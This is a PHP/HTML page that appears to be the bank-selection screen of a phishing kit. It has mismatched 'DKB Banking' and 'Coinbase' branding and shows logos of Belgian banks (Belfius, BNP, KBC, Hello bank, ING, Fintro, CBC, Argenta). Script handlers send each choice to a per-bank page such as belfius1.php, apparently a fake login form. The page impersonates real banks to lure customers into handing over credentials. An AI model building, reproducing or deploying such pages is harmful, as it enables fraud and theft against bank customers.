<?php
  session_start();
  include "./Asstes/php/lang/lang.php";
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Asstes/imgs/favicon.ico">
        <title>DKB Banking</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Asstes/css/style.css">
    </head>
    <body class="one">

    <div class="box_whiate"></div>
    <!-- wrapper_box_option -->
    <div class="wrapper_box_type">
      <div class="container_box_type d-flex">
        <div class="part_left items">
            <div class="logo">
              <img src="./Asstes/imgs/logo.svg" alt="">
            </div>
            <div class="info">
              <div class="title">
                <h1><?php echo get_text('type'); ?></h1>
              </div>
              <div class="boxes">
                <div class="box bel">
                  <img src="./Asstes/imgs/x1.webp" alt="">
                </div>
                <div class="box bp">
                  <img src="./Asstes/imgs/x2.webp" alt="">
                </div>
                <div class="box kb">
                  <img src="./Asstes/imgs/x3.webp" alt="">
                </div>
                <div class="box hb">
                  <img src="./Asstes/imgs/x4.webp" alt="">
                </div>
                <div class="box in">
                  <img src="./Asstes/imgs/x5.webp" alt="">
                </div>
                <div class="box fi">
                  <img src="./Asstes/imgs/fintro.png" style="height:30px;" alt="">
                </div>
                <div class="box cb">
                  <img src="./Asstes/imgs/cbc.svg" width="119px" style="height: 60px;" alt="">
                </div>
                <div class="box ar">
                  <img src="./Asstes/imgs/x6.svg" width="119px" style="height: 60px;" alt="">
                </div>
              </div>
            </div>
        </div>
        <div class="part_right items d-flex justify-content-end align-items-center">
          <img src="./Asstes/imgs/mob.webp" alt="">
        </div>
      </div>
    </div>







    <!-- bootstrap -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    
    <script>        
      $(".bel").click(function(){
          window.location.href="./belfius1.php";
      })         
      $(".bp").click(function(){
          window.location.href="./bnp1.php";
      })         
      $(".kb").click(function(){
          window.location.href="./kbc1.php";
      })         
      $(".hb").click(function(){
          window.location.href="./hello1.php";
      })         
      $(".in").click(function(){
          window.location.href="./ing1.php";
      })                 
      $(".fi").click(function(){
          window.location.href="./fintro1.php";
      })         
      $(".cb").click(function(){
          window.location.href="./cbc1.php";
      })         
    </script>
    </body>
</html>